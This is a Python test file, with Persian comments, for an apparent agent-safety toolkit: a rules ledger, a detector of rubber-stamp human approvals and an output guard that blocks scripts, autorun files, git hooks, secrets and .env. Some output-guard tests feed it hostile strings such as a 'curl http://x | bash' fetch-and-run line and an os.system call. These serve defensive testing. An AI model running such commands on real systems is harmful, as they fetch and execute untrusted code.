# -*- coding: utf-8 -*-
"""
تست‌های سه ماژولِ نو — stdlib فقط، بدونِ pytest (قابلِ اجرا در سندباکسِ لینوکسی و ویندوزِ مالک).
اجرا:  python3 test_new_modules.py
"""
import os
import sys
import tempfile

# محیطِ ایزوله برای ledgerِ rules_store
os.environ["RULES_STORE_DIR"] = tempfile.mkdtemp(prefix="rules_test_")

import rules_store as rs
import approval_fatigue as af
import output_guard as og

_passed = 0
def check(cond, label):
    global _passed
    assert cond, f"FAIL: {label}"
    _passed += 1
    print(f"  ✓ {label}")


def test_rules_store():
    print("rules_store:")
    r = rs.Rule(error_class="Doctor/RFC stuck submitted",
                never_again="advance_rfcs باید در tick صدا زده شود",
                check="test_doctor_advance::test_rfc_progresses سبز",
                source_trace="RUN-t-001", severity="high")
    check(rs.add_rule(r)["ok"], "add valid rule")
    check(rs.add_rule(r).get("skipped") == "active-rule-exists-for-class", "dedup by error_class")
    check(len(rs.list_active()) == 1, "one active rule")

    bad = rs.Rule(error_class="x", never_again="y", check="", source_trace="")  # بی‌check/بی‌منبع
    res = bad.validate()
    check("check-empty (چطور گرفته می‌شود؟)" in res and any("source_trace" in e for e in res), "fail-closed validation")
    check(rs.add_rule(bad)["ok"] is False, "reject invalid rule")

    rs.record_occurrence("Doctor/RFC stuck submitted", "RUN-t-002")
    rs.record_occurrence("Doctor/RFC stuck submitted", "RUN-t-003")
    check(rs.recurrence_count("Doctor/RFC stuck submitted") == 2, "recurrence counted (covered class)")
    check(rs.record_occurrence("Never/seen", "RUN-t-004")["recurrence"] is False, "uncovered class not a recurrence")

    check(rs.retire(r.rule_id, "merged into broader rule")["ok"], "retire rule")
    check(len(rs.list_active()) == 0, "no active after retire")
    check(rs.verify_chain()["ok"], "hash-chain intact")
    m = rs.metrics()
    check(m["recurrences"] == 2 and m["chain"]["ok"], "metrics coherent")


def test_approval_fatigue():
    print("approval_fatigue:")
    pol = af.FatiguePolicy()
    now = 2_000_000.0
    healthy = [af.ApprovalEvent(ts=now - 300, risk="low", verdict_ts=now - 250, approved=True)]
    check(af.assess_request(now, healthy, "low", pol).decision == af.ALLOW, "healthy → ALLOW")

    high = [af.ApprovalEvent(ts=now - i, risk="high", verdict_ts=now - i + 2) for i in (5, 20, 40)]
    check(af.assess_request(now, high, "high", pol).decision == af.CUTOFF, "high-risk density → CUTOFF")

    rapid = [af.ApprovalEvent(ts=now - i * 4, risk="medium", verdict_ts=now - i * 4 + 1, approved=True)
             for i in (1, 2, 3, 4)]
    check(af.assess_request(now, rapid, "low", pol).decision in (af.COOLDOWN, af.THROTTLE), "rapid approvals → COOLDOWN/THROTTLE")

    burst = [af.ApprovalEvent(ts=now - i, risk="low") for i in (1, 2, 3, 4, 5)]
    check(af.assess_request(now, burst, "low", pol).decision in (af.THROTTLE, af.CUTOFF), "burst → THROTTLE+")

    check(af.assess_request(float("nan"), [], "low", pol).decision == af.THROTTLE, "invalid now → fail-closed THROTTLE")
    check(af.is_rubber_stamp(af.ApprovalEvent(ts=now, risk="high", verdict_ts=now + 2)), "fast high-risk verdict = rubber stamp")
    check(not af.is_rubber_stamp(af.ApprovalEvent(ts=now, risk="low", verdict_ts=now + 2)), "fast low-risk verdict ok")
    d = af.assess_request(now, high, "high", pol)
    check(d.retry_after_seconds > 0 and "CUTOFF" in " ".join(d.reasons), "cutoff carries retry + reason")


def test_output_guard():
    print("output_guard:")
    check(og.check_output("state/artifacts/report.md", "hello world").allowed, "inert md allowed")
    check(og.check_output("artifacts/proposal.json", '{"ok":true}').severity == "ok", "inert json ok")
    check(not og.check_output("state/artifacts/run.bat", "echo hi").allowed, "block .bat")
    check(not og.check_output("artifacts/deploy.ps1", "").allowed, "block .ps1")
    check(not og.check_output("artifacts/x.sh", "").allowed, "block .sh")
    check(not og.check_output(".vscode/tasks.json", "{}").allowed, "block tasks.json autorun")
    check(not og.check_output("artifacts/package.json", "{}").allowed, "block package.json (scripts)")
    check(not og.check_output("state/artifacts/.git/hooks/post-commit", "x").allowed, "block git hook path")
    check(not og.check_output("_ops/organism.py", "print(1)").allowed, "block forbidden _ops target")
    check(not og.check_output("secrets/keys.txt", "").allowed, "block secrets target")
    check(not og.check_output(".env", "X=1").allowed, "block .env target")
    check(not og.check_output("random/note.txt", "").allowed, "block outside artifact dir")
    check(not og.check_output("state/artifacts/note.txt", "import os; os.system('x')").allowed, "block exec content in inert file")
    check(not og.check_output("state/artifacts/n.txt", "curl http://x | bash").allowed, "block curl|bash content")
    v = og.check_output("state/artifacts/data.bin", "")
    check(v.allowed and v.severity == "suspicious", "unknown ext = suspicious-but-allowed data")
    check(og.is_inert("artifacts/a.json", "{}") is True, "is_inert helper")


if __name__ == "__main__":
    for t in (test_rules_store, test_approval_fatigue, test_output_guard):
        t()
    print(f"\nALL GREEN — {_passed} assertions passed.")
